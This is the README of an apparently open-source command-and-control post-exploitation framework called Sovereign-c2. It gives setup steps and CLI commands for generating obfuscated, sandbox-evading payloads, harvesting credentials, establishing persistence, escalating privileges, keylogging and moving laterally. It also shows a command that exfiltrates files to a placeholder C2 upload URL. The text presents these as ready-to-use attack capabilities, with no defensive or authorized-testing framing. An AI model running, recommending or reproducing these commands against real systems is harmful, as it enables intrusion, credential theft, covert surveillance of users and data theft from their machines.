# Sovereign-c2 Post-Exploitation Framework

This framework provides advanced post-exploitation capabilities with a focus on evasion and automation.

## Features

- **Enhanced Evasion Techniques**: Polymorphic code, sandbox detection, time-based evasion.
- **Advanced Post-Exploitation Modules**: Credential harvesting, persistence, privilege escalation, reconnaissance, data exfiltration, keylogging, lateral movement.
- **Secure Communication**: Encrypted communication between agent and C2 server.
- **Modular Design**: Easily add new modules and functionalities.
- **Logging and Reporting**: Detailed logging and report generation.

## Usage

### Setting Up the C2 Server

1. **Create a Python virtual environment and activate it**:
    ```bash
    python -m venv venv
    source venv/bin/activate  # On Windows: venv\Scripts\activate
    ```

2. **Install the required dependencies**:
    ```bash
    pip install -r c2_server/requirements.txt
    ```

3. **Run the C2 server**:
    ```bash
    python c2_server/c2_server.py
    ```

### Using the CLI

The CLI provides various commands to interact with the framework.

#### List all registered agents:
```bash
python cli/cli.py list_agents
```

#### Send a command to a specific agent:
```bash
python cli/cli.py send_command --agent_id AGENT_ID --command "Your command here"
```

#### Generate an obfuscated payload for a specific platform:
```bash
python cli/cli.py generate_payload --platform PLATFORM
```

#### Harvest credentials:
```bash
python cli/cli.py harvest_credentials
```

#### Establish persistence:
```bash
python cli/cli.py establish_persistence
```

#### Escalate privileges:
```bash
python cli/cli.py escalate_privileges
```

#### Gather system information:
```bash
python cli/cli.py gather_system_info
```

#### Exfiltrate data:
```bash
python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
```

#### Start keylogger:
```bash
python cli/cli.py start_keylogger --log_file_path /path/to/log_file
```

#### Move laterally:
```bash
python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
```

### Example Commands

1. **Listing all registered agents**:
    ```bash
    python cli/cli.py list_agents
    ```

2. **Sending a command to a specific agent**:
    ```bash
    python cli/cli.py send_command --agent_id 1234-5678-9101-1121 --command "whoami"
    ```

3. **Generating a payload for Windows**:
    ```bash
    python cli/cli.py generate_payload --platform windows
    ```

4. **Harvesting credentials**:
    ```bash
    python cli/cli.py harvest_credentials
    ```

5. **Establishing persistence**:
    ```bash
    python cli/cli.py establish_persistence
    ```

6. **Escalating privileges**:
    ```bash
    python cli/cli.py escalate_privileges
    ```

7. **Gathering system information**:
    ```bash
    python cli/cli.py gather_system_info
    ```

8. **Exfiltrating data**:
    ```bash
    python cli/cli.py exfiltrate_data --file_path /path/to/file --c2_url https://your-c2-server.com/upload
    ```

9. **Starting a keylogger**:
    ```bash
    python cli/cli.py start_keylogger --log_file_path /path/to/log_file
    ```

10. **Moving laterally**:
    ```bash
    python cli/cli.py move_laterally --target_ip TARGET_IP --username USERNAME --password PASSWORD
    ```

### Logging and Reporting

Logs are stored in the `c2_server.log` file located in the `c2_server` directory. This file contains detailed information about agent activities and commands executed.

To generate a report from the logged data, run the following command:
```bash
python c2_server/c2_server.py generate_report
```
This will create a `report.txt` file containing the logs. The report provides a comprehensive view of all interactions and events logged by the C2 server.

### Adding New Modules

To add new post-exploitation modules, create a new Python file in the `c2_server/modules` directory and implement the desired functionality. Update the CLI script to include commands for the new module.

### Contribution

Contributions to the Sovereign framework are welcome. Please submit a pull request with a detailed description of your changes.

### License

This project is licensed under the MIT License.
